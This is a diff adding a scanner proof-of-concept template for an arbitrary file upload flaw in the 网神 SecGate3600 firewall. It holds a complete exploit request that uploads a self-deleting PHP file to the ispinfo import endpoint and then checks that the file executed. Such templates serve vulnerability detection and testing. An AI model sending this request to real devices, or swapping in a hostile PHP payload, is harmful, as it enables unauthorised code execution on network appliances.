@@ -1,0 +1,62 @@
+id: poc-yaml-wangshen-secgate3600-ispinfo-anyfile-upload
+info:
+  name: 网神SecGate3600防火墙 ispinfo 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file_upload
+  description: |
+    网神SecGate3600防火墙存在任意文件上传漏洞，攻击者可以上传恶意文件并执行。
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/?g=route_ispinfo_import_save"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+    body: |-
+      ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+      Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+      10000000
+      ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+      Content-Disposition: form-data; name="reqfile"; filename="{{t1}}.php"
+      Content-Type: text/plain
+
+      <?php echo md5({{t1}});unlink(__FILE__);?>
+      ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+      Content-Disposition: form-data; name="submit_post"
+
+      route_ispinfo_import_save
+      ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "文件"
+      - type: word
+        part: body
+        words:
+          - "网神SecGate 3600防火墙"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/attachements/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
